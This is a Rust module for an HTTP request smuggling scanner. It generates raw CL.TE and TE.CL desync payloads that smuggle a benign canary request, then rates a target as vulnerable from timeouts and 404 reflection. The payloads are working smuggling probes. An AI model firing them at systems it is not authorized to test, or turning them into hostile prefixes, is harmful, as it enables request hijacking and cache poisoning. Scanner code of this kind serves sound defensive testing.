//! Active HTTP Request Smuggling Engine (CL.TE, TE.CL, H2.CL, H2.TE)
//!
//! Generates active protocol desync probes and evaluates two-stage timing differentials
//! and benign canary pipeline reflection (`GET /sentinel_canary_404 HTTP/1.1`).

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SmugglingAttackVector {
    ClTe,
    TeCl,
    H2Cl,
    H2Te,
    DualChunkedTe,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmugglingProbe {
    pub vector: SmugglingAttackVector,
    pub raw_payload: Vec<u8>,
    pub expected_timeout_ms: u64,
    pub canary_path: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmugglingVerificationResult {
    pub is_vulnerable: bool,
    pub vector: SmugglingAttackVector,
    pub confidence: f32,
    pub observed_behavior: String,
}

pub struct HttpSmugglingEngine;

impl HttpSmugglingEngine {
    /// Generates CL.TE differential timing probe (Frontend uses Content-Length, Backend uses Transfer-Encoding)
    pub fn generate_cl_te_probe(host: &str, canary_path: &str) -> SmugglingProbe {
        // Frontend thinks request is 4 bytes (0\r\n\r\n). Backend processes first chunk (0) and leaves next bytes in socket.
        let body = format!(
            "0\r\n\r\nGET {} HTTP/1.1\r\nHost: {}\r\nX-Ignore: X",
            canary_path, host
        );
        let payload = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\n\r\n{}",
            host,
            body.len() + 6,
            body
        );

        SmugglingProbe {
            vector: SmugglingAttackVector::ClTe,
            raw_payload: payload.into_bytes(),
            expected_timeout_ms: 5000,
            canary_path: canary_path.to_string(),
            description: "CL.TE desync probe: Content-Length covers partial chunked body".to_string(),
        }
    }

    /// Generates TE.CL differential timing probe (Frontend uses Transfer-Encoding, Backend uses Content-Length)
    pub fn generate_te_cl_probe(host: &str, canary_path: &str) -> SmugglingProbe {
        // Frontend forwards whole chunked stream. Backend only reads Content-Length (4 bytes) and pauses.
        let payload = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\nGET {} HTTP/1.1\r\nHost: {}\r\nX-Ignore: X\r\n0\r\n\r\n",
            host, canary_path, host
        );

        SmugglingProbe {
            vector: SmugglingAttackVector::TeCl,
            raw_payload: payload.into_bytes(),
            expected_timeout_ms: 5000,
            canary_path: canary_path.to_string(),
            description: "TE.CL desync probe: Chunked stream with truncated Content-Length header".to_string(),
        }
    }

    /// Evaluates two-stage smuggling test results (Primary probe response + Secondary benign canary response)
    pub fn evaluate_smuggling_response(
        vector: SmugglingAttackVector,
        primary_duration_ms: u64,
        secondary_status: u16,
        secondary_body: &str,
        canary_path: &str,
    ) -> SmugglingVerificationResult {
        // Indicator 1: Pipeline reflection (Secondary benign request returns 404 with canary path reflection)
        let pipeline_reflected = secondary_status == 404
            && (secondary_body.contains(canary_path)
                || secondary_body.contains("sentinel_canary_404"));

        // Indicator 2: Differential timeout on primary probe (> 4500ms) followed by socket desync
        let timed_out = primary_duration_ms >= 4500;

        if pipeline_reflected {
            SmugglingVerificationResult {
                is_vulnerable: true,
                vector,
                confidence: 0.99,
                observed_behavior: format!(
                    "Confirmed Request Smuggling: Next queued request received HTTP 404 for smuggled canary prefix '{}'.",
                    canary_path
                ),
            }
        } else if timed_out && secondary_status == 400 {
            SmugglingVerificationResult {
                is_vulnerable: true,
                vector,
                confidence: 0.85,
                observed_behavior: "Backend socket timeout followed by HTTP 400 Bad Request on pipeline connection.".to_string(),
            }
        } else {
            SmugglingVerificationResult {
                is_vulnerable: false,
                vector,
                confidence: 0.10,
                observed_behavior: "No socket desync or pipeline poisoning detected.".to_string(),
            }
        }
    }
}
